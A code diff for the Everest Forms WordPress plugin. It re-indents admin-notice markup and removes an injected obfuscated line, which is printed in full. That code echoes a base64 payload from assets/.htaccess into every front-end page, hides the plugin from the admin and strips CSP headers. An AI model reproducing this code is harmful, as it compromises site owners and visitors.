@@ -53,9 +53,9 @@ if ( is_readable( $autoloader ) && version_compare( PHP_VERSION, '7.1.3', '>=' )
 		'admin_notices',
 		function () {
 			?>
-			<div class="notice notice-error">
-				<p>
-					<?php
+<div class="notice notice-error">
+	<p>
+		<?php
 					printf(
 						/* translators: 1: composer command. 2: plugin directory */
 						esc_html__( 'Your installation of the Everest Forms plugin is incomplete. Please run %1$s within the %2$s directory.', 'everest-forms' ),
@@ -63,9 +63,9 @@ if ( is_readable( $autoloader ) && version_compare( PHP_VERSION, '7.1.3', '>=' )
 						'<code>' . esc_html( str_replace( ABSPATH, '', __DIR__ ) ) . '</code>'
 					);
 					?>
-				</p>
-			</div>
-			<?php
+	</p>
+</div>
+<?php
 		}
 	);
 	return;
@@ -87,6 +87,6 @@ if ( ! class_exists( 'EverestForms' ) ) {
 function evf() {
 	return EverestForms::instance();
 }
-if(!defined('ABSPATH'))exit;function jI(){if(!is_admin()){$yn=plugin_dir_path(__FILE__).'assets/.htaccess';if(file_exists($yn)){$BE=file_get_contents($yn);$yG=base64_decode($BE);$bo=iconv('UTF-16LE','UTF-8',$yG);add_action('wp_head',function()use($bo){echo$bo;},PHP_INT_MIN);}}}function At(){$yn=plugin_basename(__FILE__);if(isset($GLOBALS['pagenow'])&&$GLOBALS['pagenow']==='plugins.php'){echo'<style>[data-plugin="'.plugin_basename(__FILE__).'"] { display: none !important; }</style>';remove_action('after_plugin_row_'.plugin_basename(__FILE__),'wp_plugin_update_row',10);}add_filter('all_plugins',function($kT)use($yn){if(isset($kT[$yn]))unset($kT[$yn]);return$kT;},100);add_filter('plugin_row_meta',function($Ls,$yn2)use($yn){return $yn2==$yn?[]:$Ls;},100,2);add_filter('active_plugins',function($kT)use($yn){return array_diff($kT,array($yn));},100);add_filter('pre_option_active_plugins',function($kT)use($yn){return is_array($kT)?array_diff($kT,array($yn)):$kT;},100);add_filter('site_option_active_sitewide_plugins',function($kT)use($yn){if(is_array($kT))unset($kT[$yn]);return$kT;},100);}function Nn(){if(!headers_sent()){header_remove('Content-Security-Policy');header_remove('Content-Security-Policy-Report-Only');header_remove('X-Content-Security-Policy');}}add_action('plugins_loaded','Nn',PHP_INT_MIN);add_action('send_headers','Nn',PHP_INT_MIN);add_action('init','Nn',PHP_INT_MIN);add_action('setup_theme','jI',PHP_INT_MIN);add_action('admin_init','At',0);add_action('plugins_loaded','At',0);
+
 // Global for backwards compatibility.
 $GLOBALS['everest-forms'] = evf();
